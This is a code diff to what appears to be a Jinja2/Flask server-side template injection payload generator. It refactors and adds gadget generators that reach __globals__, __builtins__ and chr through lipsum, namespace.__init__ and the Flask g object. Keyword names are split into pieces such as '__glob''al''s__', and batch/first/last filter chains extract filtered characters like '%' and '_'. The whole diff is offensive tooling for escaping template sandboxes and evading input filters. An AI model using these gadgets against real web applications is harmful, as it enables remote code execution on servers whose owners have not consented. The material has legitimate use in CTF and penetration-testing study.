@@ -718,8 +718,7 @@ class PayloadGenerator:
         """
         gen_type, *args = gen_req
         if gen_type not in expression_gens or len(expression_gens[gen_type]) == 0:
-            logger.error("Unknown type: %s", gen_type)
-            return None
+            raise RuntimeError(f"Unknown type: {gen_type}")
 
         gens = expression_gens[gen_type].copy()
         if self.options.detect_mode == DetectMode.FAST:
@@ -1908,41 +1907,49 @@ def gen_string_lower_c_namespacebatch(context):
 
 @expression_gen
 def gen_string_lower_c_classbatch(context):
-    alternatives = [
-        [
-            (LITERAL, f"({class_obj}|{tostring_filter}"),
-            (LITERAL, "|batch("),
-            (INTEGER, 2),
-            (LITERAL, ")|first|last)"),
-        ]
-        for class_obj in [
+    class_alternatives: List[List[Target]] = [
+        [(LITERAL, s)]
+        for s in [
             "range",
             "cycler",
             "joiner",
             "namespace",
         ]
-        for tostring_filter in ["trim", "string"]
     ]
-    return [(EXPRESSION, precedence["filter"], [(ONEOF, alternatives)])]
+    tostring_alternatives: List[List[Target]] = [
+        [(LITERAL, s)]
+        for s in [
+            "trim",
+            "string",
+        ]
+    ]
+    targets = targets_from_pattern(
+        "{CLASS}|{TOSTRING}|batch({2})|first|last",
+        {
+            "{CLASS}": (ONEOF, class_alternatives),
+            "{TOSTRING}": (ONEOF, tostring_alternatives),
+            "{2}": (INTEGER, 2),
+        },
+    )
+    return [(EXPRESSION, precedence["filter"], targets)]
 
 
 @expression_gen
 def gen_string_lower_c_classbatch2(context):
-    alternatives = [
-        [
-            (LITERAL, f"({class_obj}|e"),
-            (LITERAL, "|batch("),
-            (INTEGER, 5),
-            (LITERAL, ")|first|last)"),
-        ]
-        for class_obj in [
+    class_alternatives: List[List[Target]] = [
+        [(LITERAL, s)]
+        for s in [
             "range",
             "cycler",
             "joiner",
             "namespace",
         ]
     ]
-    return [(EXPRESSION, precedence["filter"], [(ONEOF, alternatives)])]
+    targets = targets_from_pattern(
+        "{CLASS}|e|batch({5})|first|last",
+        {"{CLASS}": (ONEOF, class_alternatives), "{5}": (INTEGER, 5)},
+    )
+    return [(EXPRESSION, precedence["filter"], targets)]
 
 
 # ---
@@ -1980,11 +1987,38 @@ def gen_string_percent_urlencode2(context):
 
 @expression_gen
 def gen_string_percent_lipsum1(context):
+    target_list = targets_from_pattern(
+        "lipsum[GLOBALS][BUILTINS][CHR](37)",
+        {
+            "GLOBALS": (
+                ONEOF,
+                [
+                    [(LITERAL, "'__glob''al''s__'")],
+                    [(VARIABLE_OF, "__globals__")],
+                ],
+            ),
+            "BUILTINS": (
+                ONEOF,
+                [
+                    [(LITERAL, "'__builti''ns__'")],
+                    [(VARIABLE_OF, "__builtins__")],
+                ],
+            ),
+            "CHR": (
+                ONEOF,
+                [
+                    [(LITERAL, "'ch''r'")],
+                    [(VARIABLE_OF, "chr")],
+                ],
+            ),
+            "37": (INTEGER, 37),
+        },
+    )
     return [
         (
             EXPRESSION,
             precedence["function_call"],
-            [(LITERAL, "lipsum['__glob''al''s__']['__builti''ns__']['chr'](37)")],
+            target_list,
         )
     ]
 
@@ -2109,16 +2143,40 @@ def gen_string_percent_moddoc(context):
 
 @expression_gen
 def gen_string_percent_namespace(context):
-    target_list = [
-        (
-            LITERAL,
-            "namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr'](",
-        ),
-        (WHITESPACE,),
-        (INTEGER, 37),
-        (WHITESPACE,),
-        (LITERAL, ")"),
-    ]
+    target_list = targets_from_pattern(
+        "namespace[INIT][GLOBALS][BUILTINS]['chr'](37)",
+        {
+            "INIT": (
+                ONEOF,
+                [
+                    [(LITERAL, "'__ini''t__'")],
+                    [(VARIABLE_OF, "__init__")],
+                ],
+            ),
+            "GLOBALS": (
+                ONEOF,
+                [
+                    [(LITERAL, "'__glob''al''s__'")],
+                    [(VARIABLE_OF, "__globals__")],
+                ],
+            ),
+            "BUILTINS": (
+                ONEOF,
+                [
+                    [(LITERAL, "'__builti''ns__'")],
+                    [(VARIABLE_OF, "__builtins__")],
+                ],
+            ),
+            "CHR": (
+                ONEOF,
+                [
+                    [(LITERAL, "'ch''r'")],
+                    [(VARIABLE_OF, "chr")],
+                ],
+            ),
+            "37": (INTEGER, 37),
+        },
+    )
     return [(EXPRESSION, precedence["function_call"], target_list)]
 
 
@@ -2433,45 +2491,33 @@ def gen_string_many_percent_lower_c_literal2(context, count: int):
 @expression_gen
 def gen_string_many_percent_lower_c_replacespace(context, count: int):
     # (x|center(2)|replace(x|center|first,'%c'))
-    target_list = [
-        (LITERAL, "x|center("),
-        (INTEGER, count),
-        (LITERAL, ")|replace(x|center|first,"),
-        (STRING_PERCENT_LOWER_C,),
-        (WHITESPACE,),
-        (LITERAL, ")"),
-    ]
+    target_list = targets_from_pattern(
+        "x|center( COUNT )|replace(x|center|first,'%c' )",
+        {
+            "COUNT": (INTEGER, count),
+            "'%c'": (STRING_PERCENT_LOWER_C,),
+            " ": (WHITESPACE,),
+        },
+    )
+
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
 @expression_gen
 def gen_string_many_percent_lower_c_nulljoin(context, count: int):
     # ((x,x,x)|join('%c'))
-    target_list = (
-        [
-            (LITERAL, "("),
-        ]
-        + [(LITERAL, "x,") for _ in range(count + 1)]
-        + [
-            (LITERAL, ")|join("),
-            (WHITESPACE,),
-            (STRING_PERCENT_LOWER_C,),
-            (WHITESPACE,),
-            (LITERAL, ")"),
-        ]
-    )
-    return [(EXPRESSION, precedence["filter"], target_list)]
-
-
-@expression_gen
-def gen_string_many_percent_lower_c_nulljoin2(context, count: int):
-    # ((x,x,x)|join('%c'))
-    target_list = (
-        [
-            (LITERAL, "("),
-        ]
-        + [(LITERAL, "x,") for _ in range(count + 1)]
-        + [(LITERAL, ")|join("), (STRING_PERCENT_LOWER_C,), (LITERAL, ",)")]
+    if count == 1:
+        return [(STRING_PERCENT_LOWER_C,)]
+    target_list = targets_from_pattern(
+        "( ( {TUPLE}{,} )|join( {PERCENT_LOWER_C} ) )",
+        {
+            "{TUPLE}": join_target(
+                (LITERAL, ","), [(LITERAL, "x") for _ in range(count + 1)]
+            ),
+            "{PERCENT_LOWER_C}": (STRING_PERCENT_LOWER_C,),
+            "{,}": (ONEOF, [[(LITERAL, "")], [(LITERAL, "")]]),
+            " ": (WHITESPACE,),
+        },
     )
     return [(EXPRESSION, precedence["filter"], target_list)]
 
@@ -2483,21 +2529,18 @@ def gen_string_many_percent_lower_c_concat(context, count: int):
 
 @expression_gen
 def gen_string_many_percent_lower_c_join(context, count: int):
-    l = [
-        (
-            [
-                (LITERAL, "("),
-                (STRING_PERCENT_LOWER_C,),
-            ]
-            if i == 0
-            else [
+    if count == 1:
+        return [(STRING_PERCENT_LOWER_C,)]
+    target_list = targets_from_pattern(
+        "( PARTS )|join",
+        {
+            "PARTS": join_target(
                 (LITERAL, ","),
-                (STRING_PERCENT_LOWER_C,),
-            ]
-        )
-        for i in range(count)
-    ] + [[(LITERAL, ")|join")]]
-    target_list = [item for lst in l for item in lst]
+                targets=[(STRING_PERCENT_LOWER_C,) for _ in range(count)],
+            ),
+            " ": (WHITESPACE,),
+        },
+    )
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
@@ -2517,11 +2560,6 @@ def gen_string_underline_literal2(context):
 @expression_gen
 def gen_string_underline_context(context: dict):
     return [(EXPRESSION, precedence["literal"], [(VARIABLE_OF, "_")])]
-    # if "_" in context.values():
-    #     v = [k for k, v in context.items() if v == "_"][0]
-    #     target_list = [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
-    #     return [(EXPRESSION, precedence["literal"], target_list)]
-    # return [(UNSATISFIED,)]
 
 
 @expression_gen
@@ -2543,35 +2581,30 @@ def gen_string_underline_format(context):
 
 @expression_gen
 def gen_string_underline_lipsum(context):
-    target_list = [
-        (LITERAL, "lipsum|escape|batch("),
-        (INTEGER, 22),
-        (LITERAL, ")|list|first|last"),
-    ]
+    target_list = targets_from_pattern(
+        "lipsum|escape|batch(22)|list|first|last", {"22": (INTEGER, 22)}
+    )
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
 @expression_gen
 def gen_string_underline_tupleselect(context):
-    target_list = [
-        (LITERAL, "()|select|string|batch("),
-        (INTEGER, 25),
-        (LITERAL, ")|first|last"),
-    ]
+    target_list = targets_from_pattern(
+        "()|select|string|batch(25)|first|last", {"25": (INTEGER, 25)}
+    )
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
 @expression_gen
 def gen_string_underline_gget(context):
-    # g|attr("get")|e|batch(18)|first|last
-    target_list = [
-        (FLASK_CONTEXT_VAR, "g"),
-        (LITERAL, "|attr("),
-        (VARIABLE_OF, "get"),
-        (LITERAL, ")|e|batch("),
-        (INTEGER, 18),
-        (LITERAL, ")|first|last"),
-    ]
+    target_list = targets_from_pattern(
+        "{G}|attr({GET})|e|batch({18})|first|last",
+        {
+            "{G}": (FLASK_CONTEXT_VAR, "g"),
+            "{GET}": (VARIABLE_OF, "get"),
+            "{18}": (INTEGER, 18),
+        },
+    )
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
@@ -2624,6 +2657,21 @@ def gen_string_twounderline_formatfilter(context):
 
 
 # ---
+
+
+@expression_gen
+def gen_string_many_format_c_simple(context, num):
+    return [
+        (
+            MULTIPLY,
+            (
+                EXPRESSION,
+                precedence["literal"],
+                [(ONEOF, [[(LITERAL, "'{:c}'")], [(LITERAL, '"{:c}"')]])],
+            ),
+            (INTEGER, num),
+        )
+    ]
 
 
 @expression_gen
@@ -2722,15 +2770,20 @@ def gen_char_flaskg(context, c):
         13: "o",
         14: "f",
     }
+    if c not in d.values():
+        return [(UNSATISFIED,)]
     matches = []
-    pattern = "|e|batch(INDEX)|first|last"
     for index, value in d.items():
         if value == c:
             matches.append(
-                [
-                    (FLASK_CONTEXT_VAR, "g"),
-                    (LITERAL, pattern.replace("INDEX", str(index))),
-                ]
+                targets_from_pattern(
+                    "{G}|e|batch({INDEX})|first|last",
+                    {"{G}": (FLASK_CONTEXT_VAR, "g"), "{INDEX}": (INTEGER, index)},
+                )
+                # [
+                #     (FLASK_CONTEXT_VAR, "g"),
+                #     (LITERAL, pattern.replace("INDEX", str(index))),
+                # ]
             )
     target_list = [(ONEOF, matches)]
     return [(EXPRESSION, precedence["filter"], target_list)]
@@ -2756,10 +2809,13 @@ def gen_char_namespacedict(context, c):
 def gen_char_num(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
-    target_list = [
-        (INTEGER, int(c)),
-        (LITERAL, ".__str__( )"),
-    ]
+    target_list = targets_from_pattern(
+        "INT.__str__( )",
+        {
+            "INT": (ENCLOSE_UNDER, precedence["attribute"], (INTEGER, int(c))),
+            " ": (WHITESPACE,),
+        },
+    )
     return [(EXPRESSION, precedence["function_call"], target_list)]
 
 
@@ -3022,7 +3078,7 @@ def gen_string_removedunder4(context: dict, value: str):
         return [(UNSATISFIED,)]
     # "%slo%%s"|format("__")|format("__")
     targets = targets_from_pattern(
-        "{STRING}{WS}|{WS}format({WS}{DUNDER}{WS}){WS}|{WS}format({WS}{DUNDER}{WS})",
+        "{STRING} | format( {DUNDER} ) | format( {DUNDER} )",
         {
             "{STRING}": (
                 ENCLOSE_UNDER,
@@ -3030,7 +3086,7 @@ def gen_string_removedunder4(context: dict, value: str):
                 (STRING, "%s" + value[2:-2] + "%%s"),
             ),
             "{DUNDER}": (ENCLOSE_UNDER, precedence["mod"], (STRING_TWOUNDERLINE,)),
-            "{WS}": (WHITESPACE,),
+            " ": (WHITESPACE,),
         },
     )
     return [(EXPRESSION, precedence["filter_with_function_call"], targets)]
@@ -3415,8 +3471,8 @@ def gen_string_lipsumtobytes4(context: dict, value: str):
 def gen_string_lipsumtobytes5(context: dict, value: str):
 
     bytes_targets = targets_from_pattern(
-        "lipsum|attr(GLOBALS)|attr(GETITEM)(BUILTINS)"
-        "|attr(GETITEM)(BYTES)( ( INTS ) MAYBE_COMMA)|attr(DECODE)( )",
+        "lipsum|attr( GLOBALS )|attr( GETITEM )( BUILTINS )"
+        "|attr( GETITEM )( BYTES )( ( INTS ) MAYBE_COMMA)|attr(DECODE)( )",
         {
             "GLOBALS": (VARIABLE_OF, "__globals__"),
             "GETITEM": (VARIABLE_OF, "__getitem__"),
@@ -3585,7 +3641,7 @@ def gen_string_joinbyreplace(context: dict, value: str):
             "{2}": (INTEGER, 2),
             "{STR1}": (STRING, value[:split]),
             "{STR2}": (STRING, value[split:]),
-            "{,}": (ONEOF, [[(LITERAL, ",")], [(LITERAL, "")]]),
+            "{,}": (ONEOF, [[(LITERAL, "")], [(LITERAL, ",")]]),
         },
     )
     return [(EXPRESSION, precedence["filter"], targets)]
